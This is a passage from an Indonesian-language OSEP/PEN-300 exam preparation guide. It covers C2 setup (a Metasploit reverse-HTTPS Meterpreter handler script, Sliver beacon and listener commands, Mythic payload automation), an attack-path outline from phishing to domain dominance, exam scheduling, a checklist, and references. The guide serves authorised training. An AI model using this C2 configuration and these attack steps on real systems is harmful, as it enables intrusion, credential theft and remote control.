- Semua modul dan lab menggunakan Metasploit
- Resource scripts untuk otomatisasi
- Meterpreter staging protocol untuk custom shellcode
- Loaded with post-exploitation modules (mimikatz, kiwi, incognito)

**Resource Script (auto.rc):**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost tun0
set lport 443
set EnableStageEncoding true
set exitonsession false
set AutoRunScript post/windows/manage/migrate
run -j -z
```

**Meterpreter Stager Injection via Sliver:**
```
Sliver execute-shellcode → metasploit.x64.bin → msf handler → meterpreter
```
Approach ini menggabungkan kemudahan Metasploit dengan stealth Sliver.

### Sliver (Bishop Fox)

**Kenapa Sliver?**
- Open source, modern C2
- Native mTLS, HTTP(S), DNS C2
- Armory extensions (SharpHound, Mimikatz, Rubeus, Seatbelt)
- Execute-assembly untuk .NET tools
- Donut integration untuk convert EXE → shellcode

**Setup Sliver for OSEP:**
```bash
sliver > profiles new beacon --mtls $IP:443 --format shellcode osep-beacon
sliver > stage-listener -u tcp://$IP:8080 -p osep-beacon
sliver > mtls -L $IP -l 443
```

**Armory Extensions:**
```
armory install all
→ SharpHound, Mimikatz, Rubeus, Seatbelt, PowerView, SharpUp
```

### Mythic (SpecterOps)

**Kenapa Mythic?**
- GraphQL API untuk automasi payload generation
- Multi-agent (Apollo for Windows, Poseidon for Linux)
- Payload automation script (generate.sh)
- Proxy functionality for pivoting

**Automation Script (generate.sh approach):**
```bash
#!/bin/bash
# 1. Connect to Mythic API
# 2. Generate Apollo shellcode and EXE
# 3. Replace IP/port in all scripts
# 4. Generate encoded payloads
# 5. Prepare HTA, VBA, PowerShell delivery
```

### StageListener Bridge

StageListener memungkinkan Anda menggunakan Meterpreter staging protocol untuk serve Mythic/Sliver agents — menggabungkan kemudahan meterpreter dengan modern C2 capabilities.

```
Legacy meterpreter stager → StageListener → Mythic Apollo agent
```

---

## 6. Challenge Labs & Exam Strategy

### Challenge Labs

PEN-300 memiliki 8 Challenge Labs yang harus diselesaikan sebelum exam:

| Lab | Name | Focus |
|-----|------|-------|
| 1 | Lab 1 | Phishing + VBA basics |
| 2 | Lab 2 | AV evasion fundamentals |
| 3 | Lab 3 | AppLocker/CLM bypass |
| 4 | Lab 4 | Process injection techniques |
| 5 | Lab 5 | MSSQL attacks + lateral movement |
| 6 | Lab 6 | AD exploitation + delegation |
| 7 | **CowMotors** | Retired exam — full enterprise simulation |
| 8 | **DenkiAir** | Retired exam — multi-domain, ADCS, forest trusts |

**Critical Advice:** Kerjakan setiap challenge lab **minimal 2 kali** dengan pendekatan berbeda. CowMotors dan DenkiAir adalah retired exam sets — kemampuan menyelesaikan keduanya = Anda siap untuk exam.

### 48h Time Management

```
Day 1 (16-18 jam aktif):
  00:00 - 01:00  — Enumeration parallel semua targets (nmap, web scan)
  01:00 - 04:00  — Initial access (phishing, web exploit, SQLi)
  04:00 - 07:00  — Foothold → enumeration internal → BloodHound
  07:00 - 09:00  — Break: makan, tidur 2 jam
  09:00 - 12:00  — Lateral movement → dump creds → privesc
  12:00 - 14:00  — AD exploitation (delegation, MSSQL)
  14:00 - 16:00  — Cross-domain (if applicable)
  16:00 - 18:00  — Dokumentasi, screenshots, organize notes
  18:00 - 22:00  — SLEEP (critical — jangan skip)

Day 2 (12-14 jam aktif):
  00:00 - 01:00  — Review progress, re-enumeration
  01:00 - 04:00  — Push on stuck machines / remaining attack paths
  04:00 - 07:00  — Final push → secret.txt objective
  07:00 - 09:00  — Collect remaining flags, extra points
  09:00 - 12:00  — Finalize screenshots, verify all proof files
  12:00 - 14:00  — Start report draft, organize per-machine sections
  14:00 - 17:00  — Break, makan, persiapan mental report
  
Post-Exam (24h report window):
  - Compile per-machine attack narrative
  - Insert screenshots (IP + hostname + flag visible)
  - Write executive summary
  - Generate PDF
  - .7z archive → upload.offsec.com
```

### Attack Path Framework

```
External Perimeter
  ├── Web app → SQLi / file upload / SSTI → shell
  ├── Phishing → VBA / JScript / HTA → AMSI bypass → shellcode → C2
  └── Exposed service → known CVE → exploitation → shell
          │
          ▼
    Internal Enumeration
  ├── BloodHound (SharpHound / bloodhound-python)
  ├── MSSQL enumeration (PowerUpSQL)
  └── Network scanning (pivot via C2 proxy)
          │
          ▼
    Credential Access
  ├── Mimikatz / SAM dump / LSASS dump
  ├── Kerberoast / AS-REP roast
  └── GPP / browser / config file scraping
          │
          ▼
    Lateral Movement
  ├── Pass-the-Hash (SMB / WMI / WinRM)
  ├── Delegation abuse (RBCD / Constrained / Unconstrained)
  ├── MSSQL linked servers
  └── RDP / PSRemoting
          │
          ▼
    Domain Dominance
  ├── DCSync
  ├── ADCS abuse
  ├── Golden/Silver ticket
  └── Forest trust abuse
          │
          ▼
    Secret.txt (Final Objective)
```

### Exam Doc & Screenshot Requirements

**Valid proof screenshot format:**
```
IP address via ipconfig/ifconfig/ip addr → diterminal yang SAMA dengan
cat/type local.txt → di terminal yang SAMA dengan
flag content visible
```

**Critical rules:**
- Web shell is NOT sufficient — harus reverse shell interaktif
- RDP screenshot is NOT accepted — harus via command line
- Setiap flag harus di-submit di control panel SEBELUM exam ends
- Nama file report: `OSEP-OS-XXXXX-Exam-Report.pdf`
- Archive: `OSEP-OS-XXXXX-Exam-Report.7z` — NO password, max 200MB

### Exam Checklist

```
Pre-Exam (H-1):
  [ ] Kali VM updated + snapshotted
  [ ] Windows VM (Visual Studio + Office) ready
  [ ] All C2 profiles configured (Metasploit / Sliver / Mythic)
  [ ] Payload automation scripts tested
  [ ] AMSI bypass scripts prepared (multiple methods)
  [ ] AppLocker bypass payloads ready (InstallUtil, msbuild, regsvr32)
  [ ] Process injection/hollowing C# code compiled
  [ ] VBA macros + JScript + HTA files ready
  [ ] Python XOR/AES encoder script ready
  [ ] Web server/HTA host configured
  [ ] Note-taking tool ready (Obsidian/CherryTree with OSEP template)
  [ ] Screenshot folder structure per-machine
  [ ] BloodHound collector (SharpHound.exe) hosted
  [ ] Tools repo: Impacket, NetExec, Certipy, Rubeus, Mimikatz
  [ ] Proctoring environment set (clean desk, no phone, good lighting)

During Exam:
  [ ] VPN connected — verify network access
  [ ] Parallel enumeration — jangan sequential
  [ ] Web app scan + phishing delivery concurrently
  [ ] C2 listener active — verify callbacks
  [ ] Document EACH flag immediately (screenshot + control panel)
  [ ] 30-minute rule: stuck? try different bypass / different approach
  [ ] Sleep 6-8 hours — mandatory
  [ ] Reverts used strategically (not every 5 minutes — you have 50)
  [ ] All flags submitted to control panel before exam end
  [ ] Extra flags collected for buffer (100 pts minimum, aim for 150+)

Post-Exam (24h):
  [ ] Report structure created per-machine
  [ ] Screenshots organized per machine
  [ ] Executive summary written
  [ ] Methodology section complete
  [ ] Appendix with all code modifications
  [ ] PDF generated — test open
  [ ] 7z archive — MAX 200MB — NO password
  [ ] Upload to https://upload.offsec.com
```

---

## 7. Referensi Lengkap

### Official OffSec Resources

| # | Resource | URL |
|---|----------|-----|
| 1 | PEN-300 Course Page | https://www.offsec.com/courses/pen-300/ |
| 2 | OSEP Exam Guide | https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide |
| 3 | OSEP Exam FAQ | https://help.offsec.com/hc/en-us/articles/360049781352-OSEP-Exam-FAQ |
| 4 | PEN-300 FAQ (Advanced Evasion) | https://help.offsec.com/hc/en-us/articles/6333337739540-Advanced-Evasion-Techniques-and-Breaching-Defenses-FAQ |
| 5 | PEN-300 Syllabus (PDF) | https://www.offsec.com/documentation/PEN300-Syllabus.pdf |
| 6 | PEN-300 Syllabus (Alt) | https://manage.offsec.com/app/uploads/2023/01/PEN300-Syllabus-Google-Docs.pdf |
| 7 | PEN-300 Course Overview (PDF) | https://assets.ctfassets.net/82ripq7fjls2/Q9Z1awBYtxLw9RuHcGzsM/b27b2dcacaf7f37d6fec4f8a783cc4b0/pen-300-evasion-techniques-and-breaching-defenses-osep-self-paced.pdf |
| 8 | OffSec PEN-300 Blog Post | https://www.offsec.com/blog/new-course-pen300/ |
| 9 | nullg0re OSEP Review (OffSec Blog) | https://www.offsec.com/blog/pen300-osep-review-nullg0re/ |
| 10 | OSCE³ Certification Info | https://www.offsec.com/certificates/osce3/ |
| 11 | OffSec CPE Credits Info | https://help.offsec.com/hc/en-us/articles/15568144981780 |

### Exam Reviews & Experiences

| # | Author | Article | Year |
|---|--------|---------|------|
| 12 | Sohail Saha | OSEP in 2025 — experience, advice & criticism | 2025 |
| 13 | SOJUBEAR | My OSEP Exam Review | 2025 |
| 14 | Stellarnight | OSEP 2025 Review — Non-Tech Mid-Careerist Edition | 2025 |
| 15 | eMVee | My experience with OSEP | 2025 |
| 16 | Adrian Tiron (FORTBRIDGE) | Passing the OSEP Exam: My Journey and Review | 2025 |
| 17 | Tonee Marqus | My Review on OSEP | 2025 |
| 18 | Astik Rawat | OSEP 2024: My Review and Experience | 2024 |
| 19 | Zumi Yumi | OSEP, why is it so eepy? | 2026 |
| 20 | rouvin (ibreakstuff) | OSEP / PEN-300 Review | 2024 |
| 21 | twseptian | My Take on OSEP: Challenges, Lessons, and Real-World Relevance | 2024 |
| 22 | 0xW43L | OSEP (PEN-300) Review | 2024 |
| 23 | Spencer Abel (StationX) | Complete OSEP Certification Guide | 2026 |

### GitHub Repositories

| # | Repository | Author | Description |
|---|------------|--------|-------------|
| 24 | chvancooten/OSEP-Code-Snippets | chvancooten | Most referenced OSEP code repo — process injection, hollowing, AppLocker bypass |
| 25 | In3x0rabl3/OSEP | In3x0rabl3 | PEN-300 collection — checklist, reference, payloads, MSSQL, lateral movement |
| 26 | r4ulcl/Mythic-OSEP-CheatSheet | r4ulcl | Mythic C2 cheatsheet + automation scripts for OSEP |
| 27 | hackinaggie/OSEP-Tools-v2 | hackinaggie | Marriage of chvancooten + Octoberfest7 tools |
| 28 | Extravenger/OSEPlayground | Extravenger | OSEP playground — AMSI bypass, MSSQL, tunneling, cheatsheets |
| 29 | OoStellarnightoO/OSEP_Notes | OoStellarnightoO | Collection of OSEP notes and payloads from exam pass |
| 30 | Ross46/OSEP-PREP | Ross46 | OSEP preparation resources and links |
| 31 | mochabyte0x/MyOSEPToolBox | mochabyte0x | OSEP toolbox with CLM bypass, AES packer |
| 32 | Jancsg/OSEP-Preparation | Jancsg | OSEP prep — exploit code, AV evasion guides, attack paths |
| 33 | B4l3rI0n/OSEP | B4l3rI0n | Sample codes from the course with customizations |
| 34 | N0tMilk/OSEP-Pen-300-Reference | N0tMilk | OSEP PEN-300 reference |
| 35 | deletehead/pen_300_osep_prep | deletehead | Prep checklist tracking all course modules |
| 36 | timip/OSEP | timip | Course notes and references |
| 37 | jayesther/OSEP_OSED_TOOLS | jayesther | Tooling for OSEP and OSED |

### C2 Framework Guides

| # | Resource | Description | URL |
|---|----------|-------------|-----|
| 38 | Bishop Fox — Passing OSEP using Sliver | Complete Sliver workflow for OSEP | https://bishopfox.com/blog/passing-the-osep-exam-using-sliver |
| 39 | r4ulcl — Passing OSEP using Mythic | Mythic C2 automation for OSEP | https://r4ulcl.com/posts/passing-the-osep-exam-using-mythic-c2/ |
| 40 | Anon-Exploiter/sliver-cheatsheet | Sliver C2 cheatsheet for OSEP | https://github.com/Anon-Exploiter/sliver-cheatsheet |
| 41 | StageListener — Meterpreter to Mythic | Bridge legacy stagers with modern C2 | https://medium.com/@kash.kat/introducing-stagelistener-a-meterpreter-listener-for-c2-payloads-bd2835835d92 |

### AMSI & PowerShell Security

| # | Resource | URL |
|---|----------|-----|
| 42 | AMSI Bypass Collection (GitHub) | https://github.com/rasta-mouse/AmsiScanBufferBypass |
| 43 | SANS ISC — PowerShell AMSI Bypass | https://isc.sans.edu/forums/diary/Powershell+Dropping+a+REvil+Ransomware/27012/ |
| 44 | rastamouse — ASB Bypass Pt.3 | https://rastamouse.me/blog/asb-bypass-pt3/ |
| 45 | Red Team Cafe — PowerShell Custom RunSpace | https://www.redteam.cafe/red-team/powershell/powershell-custom-runspace |
| 46 | AMSI Documentation (Microsoft) | https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal |

### AppLocker & Application Whitelisting

| # | Resource | URL |
|---|----------|-----|
| 47 | AppLocker Bypass — InstallUtil | https://github.com/api0cradle/AppLockerBypass |
| 48 | MSDN — AppLocker Documentation | https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview |
| 49 | Oddvar Moe — AppLocker Bypass | https://oddvar.moe/ |

### Active Directory

| # | Resource | URL |
|---|----------|-----|
| 50 | SpecterOps — Certified Pre-Owned (ADCS) | https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf |
| 51 | bloodhound-ad — SharpHound Collection | https://github.com/BloodHoundAD/BloodHound |
| 52 | Rubeus — Kerberos Abuse | https://github.com/GhostPack/Rubeus |
| 53 | Certipy — ADCS Exploitation | https://github.com/ly4k/Certipy |
| 54 | PowerView — AD Enumeration | https://github.com/PowerShellMafia/PowerSploit |
| 55 | Orange Cyberdefense — AD Mindmaps | https://orange-cyberdefense.github.io/ocd-mindmaps/ |
| 56 | ired.team — AD ACL Abuse | https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces |
| 57 | Hacker Recipes — AD Movement | https://www.thehacker.recipes/ad/movement/ |
| 58 | MayanSuthar — Adversary in AD | https://github.com/MayanSuthar/Adversary-in-the-Middle-in-Active-Directory |

### MSSQL Attacks

| # | Resource | URL |
|---|----------|-----|
| 59 | PowerUpSQL — MSSQL Tooling | https://github.com/NetSPI/PowerUpSQL |
| 60 | NetSPI — PowerUpSQL Blog | https://blog.netspi.com/how-to-hack-databases-with-powerupsql/ |
| 61 | Anttn — MSSQL Penetration Testing | https://github.com/anttn/mssql-pentest |
| 62 | SQL Server xp_cmdshell Documentation | https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql |

### Process Injection & Shellcode

| # | Resource | URL |
|---|----------|-----|
| 63 | FuzzySecurity — Process Injection Tutorials | http://www.fuzzysecurity.com/tutorials.html |
| 64 | ired.team — Process Injection | https://www.ired.team/offensive-security/code-injection-process-injection |
| 65 | TheWover — Donut (Shellcode Generator) | https://github.com/TheWover/donut |
| 66 | Stephen Fewer — Reflective DLL Injection | https://github.com/stephenfewer/ReflectiveDLLInjection |
| 67 | CTI — PELoader | https://github.com/HoShiMin/PELoader |

### General Pentesting Resources

| # | Resource | URL |
|---|----------|-----|
| 68 | HackTricks | https://book.hacktricks.xyz |
| 69 | PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| 70 | GTFOBins | https://gtfobins.github.io |
| 71 | LOLBAS | https://lolbas-project.github.io |
| 72 | RevShells.com | https://www.revshells.com |
| 73 | IppSec.rocks | https://ippsec.rocks |
| 74 | Impacket Suite | https://github.com/fortra/impacket |
| 75 | NetExec | https://github.com/Pennyw0rth/NetExec |
| 76 | Chisel | https://github.com/jpillora/chisel |
| 77 | Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
| 78 | SecLists | https://github.com/danielmiessler/SecLists |
| 79 | Flangvik/SharpCollection | https://github.com/Flangvik/SharpCollection |
| 80 | Invoke-PSObfuscation | https://github.com/ghost1nvestigator/Invoke-PSObfuscation |

### Books

| # | Book | Author |
|---|------|--------|
| 81 | The Hacker Playbook 3 | Peter Kim |
| 82 | Red Team Field Manual v2 | Ben Clark & Nick Downer |
| 83 | Black Hat Python (2nd Ed.) | Justin Seitz & Tim Arnold |
| 84 | Gray Hat C# | Brandon Perry |
| 85 | Windows Internals, Part 1 & 2 (7th Ed.) | Pavel Yosifovich et al. |
| 86 | Practical Malware Analysis | Michael Sikorski & Andrew Honig |
| 87 | The IDA Pro Book (2nd Ed.) | Chris Eagle |

### Practice Labs & Environments

| # | Resource | URL |
|---|----------|-----|
| 88 | Hack The Box — Cybernetics ProLab | https://www.hackthebox.com |
| 89 | Hack The Box — Offshore ProLab | https://www.hackthebox.com |
| 90 | Hack The Box — Intro to C2 with Sliver | https://www.hackthebox.com |
| 91 | GOAD (Game of Active Directory) | https://github.com/Orange-Cyberdefense/GOAD |
| 92 | VulnLab (AD Labs) | https://vulnlab.com |
| 93 | TryHackMe — Active Directory Rooms | https://tryhackme.com |
| 94 | PentesterLab | https://pentesterlab.com |
| 95 | PortSwigger Web Security Academy | https://portswigger.net/web-security |

### YouTube Videos & Playlists

| # | Channel | Focus | URL |
|---|---------|-------|-----|
| 96 | InfosecPat — OSEP Full Course Playlist | PEN-300 course overview | https://www.youtube.com/watch?v=L_uLv3W6_3g |
| 97 | IppSec | HTB walkthroughs, AD methodology | https://www.youtube.com/@ippsec |
| 98 | John Hammond | General hacking, process injection | https://www.youtube.com/@JohnHammond010 |
| 99 | S1REN | OSCP/OSEP prep content | YouTube |
| 100 | OffSec Official | Exam tips, community content | https://www.youtube.com/@offsectraining |
| 101 | OSEP Code Snippets Walkthrough | OSEP code snippets playlist | https://www.youtube.com/playlist?list=PLJK0fZNGiFU-iKQf9oTVpYjxL72uQUQSA |

### Communities

| # | Resource | URL |
|---|----------|-----|
| 102 | r/OSEP Reddit | https://reddit.com/r/osep |
| 103 | OffSec Discord | https://discord.gg/offsec |
| 104 | OffSec Community Forums | https://forums.offsec.com |
| 105 | OffSec PEN-300 Student Discord | Accessible via course portal |

### NICCS / Government Resources

| # | Resource | URL |
|---|----------|-----|
| 106 | NICCS — PEN-300 Course Listing | https://niccs.cisa.gov/training/catalog/ata/offsec-pen-300-advanced-evasion-techniques-and-breaching-defenses-osep |
| 107 | Applied Technology Academy — PEN-300 | https://appliedtechnologyacademy.com/offsec-training/offsec-pen-300-osep-training/ |

---

> **Catatan Akhir**: OSEP adalah sertifikasi yang mengubah cara Anda mendekati penetration testing. Bukan hanya tentang "bisakah saya exploit?", tapi "bisakah saya exploit **saat ada Defender, AMSI, AppLocker, dan EDR yang menghadang?**" Fokus pada custom tooling, pahami mengapa bypass bekerja (bukan hanya copy-paste), kuasai satu C2 framework, dan dokumentasikan semuanya. Report yang baik bisa menjadi pembeda antara pass dan fail.
